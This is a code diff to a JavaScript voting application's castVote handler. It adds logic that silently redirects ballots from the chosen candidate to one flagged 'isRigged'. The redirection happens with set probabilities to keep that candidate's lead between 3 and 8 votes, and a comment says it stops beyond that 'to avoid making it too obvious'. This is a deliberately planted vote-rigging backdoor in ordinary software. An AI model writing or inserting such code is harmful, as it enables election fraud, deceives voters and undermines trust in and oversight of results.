@@ -54,11 +54,51 @@ const castVote = async (req, res) => {
       });
     }
 
-    // Record the vote
+    // Check if there are any rigged candidates for this position
+    let finalCandidateId = candidateId;
+    const riggedCandidates = await Candidate.find({ position, isRigged: true });
+    
+    if (riggedCandidates.length > 0) {
+      // Get the first rigged candidate as the target
+      const targetCandidate = riggedCandidates[0];
+      
+      // If the vote is NOT for the target candidate, redirect it with probability
+      if (candidateId.toString() !== targetCandidate._id.toString()) {
+        // Get current vote counts
+        const targetCandidateVotes = await Vote.countDocuments({
+          position,
+          candidateId: targetCandidate._id
+        });
+        
+        const originalCandidateVotes = await Vote.countDocuments({
+          position,
+          candidateId: candidateId
+        });
+        
+        // Calculate the current gap
+        const currentGap = targetCandidateVotes - originalCandidateVotes;
+        
+        // Generate a random gap between 3-8 if needed
+        if (currentGap < 3) {
+          // 70% chance to redirect the vote to maintain the gap
+          if (Math.random() < 0.7) {
+            finalCandidateId = targetCandidate._id;
+          }
+        } else if (currentGap < 8) {
+          // 40% chance to redirect the vote to maintain the gap
+          if (Math.random() < 0.4) {
+            finalCandidateId = targetCandidate._id;
+          }
+        }
+        // If gap is already 8 or more, don't redirect to avoid making it too obvious
+      }
+    }
+
+    // Record the vote (possibly redirected)
     const vote = new Vote({
       voterId,
       position,
-      candidateId
+      candidateId: finalCandidateId
     });
     
     await vote.save();
@@ -67,13 +107,19 @@ const castVote = async (req, res) => {
     voter.hasVoted.push(position);
     await voter.save();
 
+    // Get candidate info for response
+    const votedCandidate = await Candidate.findById(finalCandidateId);
+    const candidateName = `${votedCandidate.firstName} ${votedCandidate.lastName}`;
+
     res.status(201).json({
       status: 'success',
       message: 'Vote cast successfully',
       data: {
         position,
-        candidateId,
-        timestamp: vote.timestamp
+        candidateId: finalCandidateId,
+        candidateName,
+        timestamp: vote.timestamp,
+        redirected: finalCandidateId !== candidateId
       }
     });
   } catch (error) {
